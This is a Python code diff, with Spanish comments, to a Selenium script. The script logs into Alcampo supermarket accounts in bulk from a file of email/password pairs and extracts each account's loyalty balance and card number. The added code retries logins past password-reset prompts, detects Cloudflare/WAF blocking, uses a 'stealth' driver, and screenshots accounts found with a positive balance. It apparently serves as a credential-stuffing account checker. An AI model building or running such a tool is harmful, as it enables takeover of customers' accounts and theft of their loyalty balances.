@@ -11,6 +11,7 @@ on GitHub Actions or Firebase RTDB.
 import os
 import sys
 import time
+import re
 import argparse
 import json
 from pathlib import Path
@@ -49,11 +50,46 @@ from scraper.script_optimizado import (
     create_stealth_driver,
     mask_email,
     limpiar_saldo,
-    extraer_tarjeta,
     CircuitBreaker,
     _verify_and_hydrate_session,
     _extract_loyalty_balance,
+    _handle_pwreset_relogin,
+    capture_screenshot,
 )
+
+
+def extraer_tarjeta(html_content):
+    """Extrae el número de tarjeta Alcampo (13 dígitos) desde el código fuente HTML."""
+    if not html_content or not str(html_content).strip():
+        return None
+    try:
+        # 1. Canvas o parámetro query clif (?clif=4003009301402)
+        m = re.search(r'[?&]clif=(400\d{10}|280\d{10})', html_content)
+        if m:
+            return m.group(1).strip()
+
+        # 2. Selector específico de clase Sana Sans / S1 Subtitle de Alcampo
+        m = re.search(r'class="[^"]*(?:sana-sans-alt|s1-subtitle)[^"]*">\s*(?:&nbsp;|\s)*(400\d{10}|280\d{10})\s*(?:&nbsp;|\s)*</(?:span|div|p)>', html_content)
+        if m:
+            return m.group(1).strip()
+
+        # 3. Claves JSON en __NEXT_DATA__ o scripts
+        m = re.search(r'"(?:cardNumber|loyaltyCardNumber|barcode|loyaltyNumber)"\s*:\s*"(400\d{10}|280\d{10})"', html_content)
+        if m:
+            return m.group(1).strip()
+
+        # 4. En elementos HTML delimitados cerrados por etiqueta de cierre o entidad (</tag> o &lt;)
+        m = re.search(r'(?:>|&gt;)\s*(?:&nbsp;|\s)*(400200\d{7}|400300\d{7}|400\d{10}|280\d{10})\s*(?:&nbsp;|\s)*(?:</|&lt;)', html_content)
+        if m:
+            return m.group(1).strip()
+
+        # 5. En texto plano contextualizado por mención de tarjeta / club
+        m = re.search(r'(?:tarjeta|asociad[oa]|club)\D{1,30}\b(400200\d{7}|400300\d{7}|400\d{10}|280\d{10})\b', html_content, re.IGNORECASE)
+        if m:
+            return m.group(1).strip()
+    except Exception:
+        pass
+    return None
 
 
 OAUTH_DESTINATION_URL = "https://www.compraonline.alcampo.es/login?destination=%2Fsettings%2Floyalty"
@@ -116,6 +152,12 @@ def parse_arguments():
         default=None,
         help="Ruta de archivo Excel (.xlsx) donde guardar los resultados de la prueba",
     )
+    parser.add_argument(
+        "--screenshot-dir",
+        type=str,
+        default="screenshots",
+        help="Directorio donde guardar capturas de pantalla automáticas ante errores o confirmaciones de saldo",
+    )
 
     return parser.parse_args()
 
@@ -167,7 +209,26 @@ def load_accounts_from_file(file_path, limit=None):
     return normalized
 
 
-def test_single_account(driver, email, password, timeout=25, slowmo=0.0):
+def capture_screenshot(driver, email, label, screenshot_dir="screenshots"):
+    """Guarda una captura de pantalla fechada para auditoría visual forense."""
+    if not driver:
+        return None
+    try:
+        if not hasattr(driver, "save_screenshot"):
+            return None
+        os.makedirs(screenshot_dir, exist_ok=True)
+        safe_email = re.sub(r'[^a-zA-Z0-9]', '_', str(email) if email else "anon")[:48]
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        shot_path = os.path.join(screenshot_dir, f"{safe_email}_{label}_{ts}.png")
+        driver.save_screenshot(shot_path)
+        print(f"            📸 [CAPTURA GUARDADA] {shot_path}")
+        return shot_path
+    except Exception as e:
+        print(f"            ⚠️ No se pudo guardar captura: {e}")
+        return None
+
+
+def test_single_account(driver, email, password, timeout=25, slowmo=0.0, screenshot_dir="screenshots"):
     """
     Ejecuta el ciclo de autenticación y extracción paso a paso con registro detallado en consola.
     Retorna un diccionario con el resultado.
@@ -216,6 +277,10 @@ def test_single_account(driver, email, password, timeout=25, slowmo=0.0):
             result["error_type"] = err_type
             result["error_reason"] = f"Timeout esperando inputs de login ({err_reason})"
             print(f"            ❌ Fallo detectando inputs: {result['error_reason']}")
+            if err_type == "ip_error" or any(k in page_src.lower() for k in ["cloudflare", "ray id", "challenge-platform", "access denied", "blocked by cloudflare", "waf", "too many requests"]):
+                capture_screenshot(driver, email, "err_waf", screenshot_dir)
+            else:
+                capture_screenshot(driver, email, "err_inputs", screenshot_dir)
             result["duration"] = round(time.time() - start_time, 2)
             return result
 
@@ -253,6 +318,8 @@ def test_single_account(driver, email, password, timeout=25, slowmo=0.0):
         while elapsed_poll < timeout:
             curr_url = driver.current_url or ""
             curr_title = driver.title or ""
+            page_src = driver.page_source or ""
+            page_src_low = page_src.lower()
 
             # Si ya no estamos en la página de autorización de Salesforce
             if "my.site.com" not in curr_url and ("compraonline.alcampo.es" in curr_url or "alcampo.es" in curr_url):
@@ -261,17 +328,49 @@ def test_single_account(driver, email, password, timeout=25, slowmo=0.0):
                     print(f"            ✔ Redirección confirmada a: {curr_url}")
                     break
 
+            # Comprobar si apareció botón de reseteo de contraseña btnPwReset
+            has_pwreset = False
+            if "btnpwreset" in page_src_low:
+                try:
+                    res_els = driver.find_elements(By.ID, "btnPwReset")
+                    has_pwreset = any(e.is_displayed() for e in res_els)
+                except Exception:
+                    has_pwreset = True
+
+            if has_pwreset:
+                print(f"            🔄 Detectado #btnPwReset en {masked}. Reintentando login con credenciales...")
+                capture_screenshot(driver, email, "err_needs_attention", screenshot_dir)
+                relogin_ok, relogin_msg = _handle_pwreset_relogin(driver, email, password)
+                if relogin_ok:
+                    redirected = True
+                    print(f"            ✔ Re-login convalidado exitosamente tras btnPwReset.")
+                    break
+                else:
+                    err_type = "needs_attention"
+                    err_reason = relogin_msg or "Error: Requiere restablecer contraseña (btnPwReset)"
+                    result["status"] = "failed"
+                    result["error_type"] = err_type
+                    result["error_reason"] = err_reason
+                    print(f"            ❌ Re-login fallido tras btnPwReset: {err_reason}")
+                    result["duration"] = round(time.time() - start_time, 2)
+                    return result
+
             # Comprobar si apareció mensaje de error de credenciales o bloqueo de cuenta
-            page_src = driver.page_source or ""
-            if any(err_msg in page_src.lower() for err_msg in [
+            if any(err_msg in page_src_low for err_msg in [
                 "usuario o contraseña incorrectos", "credenciales incorrectas",
-                "tu cuenta ha sido bloqueada", "call center", "btnpwreset"
+                "tu cuenta ha sido bloqueada", "call center"
             ]):
                 err_type, err_reason = cb.classify_error(page_source=page_src)
                 result["status"] = "failed"
                 result["error_type"] = err_type
                 result["error_reason"] = err_reason
                 print(f"            ❌ Autenticación fallida: {err_reason} ({err_type})")
+                if "call center" in page_src_low or "cuenta ha sido bloqueada" in page_src_low:
+                    capture_screenshot(driver, email, "err_call_center", screenshot_dir)
+                elif err_type == "ip_error":
+                    capture_screenshot(driver, email, "err_waf", screenshot_dir)
+                else:
+                    capture_screenshot(driver, email, f"err_{err_type}", screenshot_dir)
                 result["duration"] = round(time.time() - start_time, 2)
                 return result
 
@@ -285,12 +384,13 @@ def test_single_account(driver, email, password, timeout=25, slowmo=0.0):
             result["error_type"] = err_type
             result["error_reason"] = err_reason
             print(f"            ❌ Timeout en redirección OAuth: {err_reason}")
+            capture_screenshot(driver, email, "err_oauth_timeout", screenshot_dir)
             result["duration"] = round(time.time() - start_time, 2)
             return result
 
         # Paso 6: Extracción de saldo y tarjeta en /settings/loyalty
         print(f" [Paso 6/6] Validando sesión y extrayendo saldo / tarjeta Alcampo...")
-        saldo_raw, card_num = _verify_and_hydrate_session(driver, timeout_s=12.0)
+        saldo_raw, card_num = _verify_and_hydrate_session(driver, timeout_s=12.0, email=email)
         val_saldo = limpiar_saldo(saldo_raw)
 
         result["balance"] = val_saldo
@@ -305,6 +405,13 @@ def test_single_account(driver, email, password, timeout=25, slowmo=0.0):
 
         print(f"            ✔ Saldo extraído:  {result['balance_str']}")
         print(f"            ✔ Tarjeta Alcampo: {result['card_number']}")
+        if val_saldo is not None and val_saldo > 0:
+            shot_label = "saldo_positivo"
+        elif val_saldo == 0:
+            shot_label = "saldo_cero_verificado" if card_num else "saldo_cero_compraonline"
+        else:
+            shot_label = "saldo_no_detectado"
+        capture_screenshot(driver, email, shot_label, screenshot_dir)
 
     except Exception as e:
         page_src = ""
@@ -317,6 +424,7 @@ def test_single_account(driver, email, password, timeout=25, slowmo=0.0):
         result["error_type"] = err_type
         result["error_reason"] = f"{err_reason} ({type(e).__name__}: {e})"
         print(f"            ❌ Error inesperado: {result['error_reason']}")
+        capture_screenshot(driver, email, "err_unexpected", screenshot_dir)
 
     result["duration"] = round(time.time() - start_time, 2)
     return result
@@ -444,6 +552,7 @@ def main():
                 password=acc["password"],
                 timeout=args.timeout,
                 slowmo=args.slowmo,
+                screenshot_dir=args.screenshot_dir,
             )
             results.append(res)
     finally:
